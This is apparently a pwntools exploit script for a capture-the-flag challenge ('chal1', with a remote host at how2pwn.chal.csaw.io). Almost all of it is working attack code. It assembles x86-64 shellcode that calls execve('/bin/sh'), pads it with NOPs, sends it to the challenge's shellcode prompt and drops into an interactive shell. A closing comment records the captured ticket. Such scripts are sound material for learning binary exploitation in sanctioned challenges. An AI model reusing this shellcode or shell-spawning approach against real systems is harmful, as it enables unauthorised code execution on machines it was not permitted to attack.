
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./public/bin/all/chal1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *main

# Before call to our shellcode (call rdx)
hbreak *main+0x6a

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def craft_shellcode():
    # invoke syscall:
    # execve("/bin/sh", ["/bin/sh", NULL], NULL);
    shellcode = asm('''
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall

    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"
    ''')
    padded_shellcode = shellcode + b'\x90'*(0x100 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x100)
    return padded_shellcode

arguments = []
if args['REMOTE']:
    remote_server = 'how2pwn.chal.csaw.io'
    remote_port = 60001
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

shellcode = craft_shellcode()

io.recvuntil(b'Enter your shellcode: ')
io.send(shellcode)
io.interactive()
io.close()

# Ticket found: 764fce03d863b5155db4af260374acc1
